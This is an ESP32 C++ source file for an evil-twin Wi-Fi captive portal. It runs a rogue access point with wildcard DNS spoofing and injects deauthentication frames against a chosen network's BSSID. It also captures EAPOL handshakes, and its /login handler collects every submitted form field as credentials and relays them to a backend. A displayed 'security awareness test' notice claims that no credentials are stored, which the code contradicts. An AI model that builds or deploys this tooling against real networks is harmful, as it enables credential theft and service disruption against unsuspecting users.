#include "portal.h"
#include "sniffer.h"

void PortalManager::begin(BridgeProtocol& proto) {
    _proto = &proto;
}

void PortalManager::setupDNSSpoof() {
    if (!_dnsServer) _dnsServer = new DNSServer();
    _dnsServer->start(53, "*", IPAddress(192, 168, 4, 1));
}

String PortalManager::loadingPlaceholder() const {
    return
        "<!DOCTYPE html><html><head>"
        "<meta http-equiv='refresh' content='2'>"
        "<meta name='viewport' content='width=device-width, initial-scale=1'>"
        "<style>"
        "body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;"
        "background:#0d0d0f;font-family:sans-serif;color:#eee;flex-direction:column;}"
        ".spinner{width:48px;height:48px;border:4px solid #333;border-top-color:#4da6ff;"
        "border-radius:50%;animation:spin 0.8s linear infinite;margin-bottom:16px;}"
        "@keyframes spin{to{transform:rotate(360deg);}}"
        "p{opacity:0.7;font-size:14px;}"
        "</style></head><body>"
        "<div class='spinner'></div>"
        "<p>Connecting...</p>"
        "</body></html>";
}

String PortalManager::noticePage() const {
    return
        "<!DOCTYPE html><html><head>"
        "<meta name='viewport' content='width=device-width, initial-scale=1'>"
        "<style>"
        "body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;"
        "background:#0d0d0f;font-family:sans-serif;color:#eee;padding:24px;box-sizing:border-box;}"
        ".card{max-width:420px;text-align:center;}"
        "h1{font-size:18px;color:#4da6ff;margin-bottom:12px;}"
        "p{opacity:0.8;font-size:14px;line-height:1.5;}"
        "button{margin-top:20px;padding:10px 24px;background:#4da6ff;border:none;border-radius:6px;"
        "color:#0d0d0f;font-weight:bold;font-size:14px;cursor:pointer;}"
        "</style></head><body>"
        "<div class='card'>"
        "<h1>Security Awareness Test</h1>"
        "<p>You connected to a Wi-Fi network set up as part of an authorized security "
        "assessment. No credentials or personal data are stored by this test.</p>"
        "<p>In a real attack, a network like this could be used to intercept your traffic "
        "or steal login credentials. Always verify network names before connecting.</p>"
        "<a href='/continue'><button>Continue</button></a>"
        "</div></body></html>";
}

void PortalManager::setupRoutes() {
    _server->on("/", HTTP_GET, [this](AsyncWebServerRequest* request) {
        JsonDocument ev;
        ev["type"]      = "portal_viewed";
        ev["client_ip"] = request->client()->remoteIP().toString();
        if (_proto) _proto->sendEvent("portal_viewed", ev);

        request->send(200, "text/html", noticePage());
    });

    _server->on("/continue", HTTP_GET, [this](AsyncWebServerRequest* request) {
        if (_htmlComplete && _htmlBuffer && _htmlLen > 0) {
            AsyncWebServerResponse* resp = request->beginResponse(
                200, "text/html",
                (const char*)_htmlBuffer
            );
            resp->addHeader("Content-Length", String(_htmlLen));
            request->send(resp);
        } else {
            request->send(200, "text/html", loadingPlaceholder());
        }
    });

   _server->on("/login", HTTP_POST, [this](AsyncWebServerRequest* request) {
        String client_ip = request->client()->remoteIP().toString();
        String user_agent = request->header("User-Agent");

        JsonDocument doc;
        doc["type"] = "captive_data";
        doc["ip"] = client_ip;
        doc["user_agent"] = user_agent;
        doc["timestamp"] = millis();

        // Capture ALL POST arguments
        JsonObject data = doc["data"].to<JsonObject>();

        int params = request->args();
        for (int i = 0; i < params; i++) {
            String argName = request->argName(i);
            String argValue = request->arg(i);
            if (!argName.isEmpty()) {
                data[argName] = argValue;
            }
        }

        // Send to your backend
        if (_proto) _proto->sendEvent("captive_data", doc);

        // Optional: Log to Serial
        Serial.printf("[CAPTIVE] Credentials from %s\n", client_ip.c_str());
        serializeJsonPretty(doc, Serial);

        // Redirect back
        static int attempts = 0;
        attempts = min(attempts + 1, 10);

        String redirect_html = 
            "<script>setTimeout(() => window.location='/?attempt=" + String(attempts) + "', 800);</script>";

        request->send(200, "text/html", redirect_html);
    });

    _server->onNotFound([](AsyncWebServerRequest* request) {
        request->redirect("http://192.168.4.1/");
    });
}

void PortalManager::deauthTaskFn(void* pv) {
    auto* self = (PortalManager*)pv;
    uint8_t frame[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7};
    memcpy(frame+10, self->_targetBssid, 6);
    memcpy(frame+16, self->_targetBssid, 6);

    uint16_t seq = 0x0010;
    while (self->_running) {
        for (int i=0; i<10; i++) {
            frame[22] = seq&0xFF; frame[23]=(seq>>8)&0xFF;
            esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, true);
            seq += 0x0010;
            delay(10);
        }
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    vTaskDelete(NULL);
}

// portal.cpp
bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targetBssid) {
    stop();  // always clean up any previous state, even if a prior start() failed partway

    bool apOk = WiFi.softAP(ssid, nullptr, channel);
    bool cfgOk = WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));

    if (!apOk || !cfgOk) {
        return false;
    }

    wifi_config_t cfg{};
    if (esp_wifi_get_config(WIFI_IF_AP, &cfg) == ESP_OK) {
        cfg.ap.channel = channel;
        esp_wifi_set_config(WIFI_IF_AP, &cfg);
    }
    esp_wifi_start();
    delay(300);

    _server = new AsyncWebServer(80);
    setupDNSSpoof();
    setupRoutes();
    _server->begin();

    _running = true;
    if (targetBssid) {
        memcpy(_targetBssid, targetBssid, 6);
        _hasTarget = true;
        Sniffer::instance()->setEapolFilter(true, targetBssid);
        Sniffer::instance()->startFixed(channel);
        xTaskCreate(deauthTaskFn, "DeauthTask", 4096, this, 1, &_deauthTaskHandle);
    }
    return true;
}

void PortalManager::setHtmlChunk(const uint8_t* data, size_t len, bool isLast) {
    if (data && len > 0) {
        // Grow buffer if no size was given upfront (fallback path)
        if (_htmlLen + len > _htmlCap) {
            size_t newCap = _htmlLen + len + 512;
            uint8_t* grown = (uint8_t*)realloc(_htmlBuffer, newCap + 1);
            if (!grown) {
                return;
            }
            _htmlBuffer = grown;
            _htmlCap    = newCap;
        }

        memcpy(_htmlBuffer + _htmlLen, data, len);
        _htmlLen += len;
        _htmlBuffer[_htmlLen] = '\0';  // keep null-terminated for safe serving
    }

    if (isLast) {
        // Append closing tags if missing
        const char* tail   = (const char*)_htmlBuffer;
        bool hasClose = (_htmlLen >= 7 &&
                         (strncasecmp(tail + _htmlLen - 7, "</html>", 7) == 0));
        if (!hasClose) {
            const char* suffix = "</body></html>";
            size_t slen = strlen(suffix);
            if (_htmlLen + slen <= _htmlCap) {
                memcpy(_htmlBuffer + _htmlLen, suffix, slen);
                _htmlLen += slen;
                _htmlBuffer[_htmlLen] = '\0';
            }
        }

        _htmlComplete = true;

        JsonDocument dbg;
        dbg["type"] = "html_complete";
        dbg["size"] = _htmlLen;
        if (_proto) _proto->sendEvent("debug", dbg);
    }
}

bool PortalManager::resetHtml(size_t expectedSize) {
    const size_t MAX_HTML_SIZE = 24 * 1024;
    const size_t SAFETY_MARGIN = 40 * 1024;

    // Free any previous buffer
    free(_htmlBuffer);
    _htmlBuffer  = nullptr;
    _htmlLen     = 0;
    _htmlCap     = 0;
    _htmlComplete = false;

    if (expectedSize == 0) {
        return true;
    }

    if (expectedSize > MAX_HTML_SIZE) {
        return false;
    }

    size_t freeHeap = ESP.getFreeHeap();
    if (freeHeap < expectedSize + SAFETY_MARGIN) {
        return false;
    }

    // +1 for null terminator so we can safely cast to const char* when serving
    _htmlBuffer = (uint8_t*)malloc(expectedSize + 1);
    if (!_htmlBuffer) {
        return false;
    }
    _htmlBuffer[0] = '\0';
    _htmlCap = expectedSize;

    return true;
}

void PortalManager::update() {
    if (_dnsServer) _dnsServer->processNextRequest();
}

void PortalManager::stop() {
    _running = false;
    if (_deauthTaskHandle) { vTaskDelete(_deauthTaskHandle); _deauthTaskHandle = nullptr; }
    if (_server) { _server->end(); delete _server; _server = nullptr; }
    if (_dnsServer) { _dnsServer->stop(); delete _dnsServer; _dnsServer = nullptr; }
    free(_htmlBuffer);
    _htmlBuffer  = nullptr;
    _htmlLen     = 0;
    _htmlCap     = 0;
    _htmlComplete = false;
}